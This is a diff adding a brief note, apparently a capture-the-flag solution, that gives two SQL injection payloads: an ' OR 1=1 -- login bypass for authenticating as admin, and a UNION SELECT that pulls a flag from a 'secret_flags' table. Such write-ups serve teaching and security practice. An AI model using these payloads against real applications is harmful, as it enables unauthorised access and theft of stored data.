@@ -1,0 +1,7 @@
+UNION-based SQL Injection:
+
+To bypass the login (authenticate as admin), you can use:
+    ' OR 1=1 --
+
+To extract the flag from the database, use:
+    ' UNION SELECT FLAG as username FROM secret_flags --
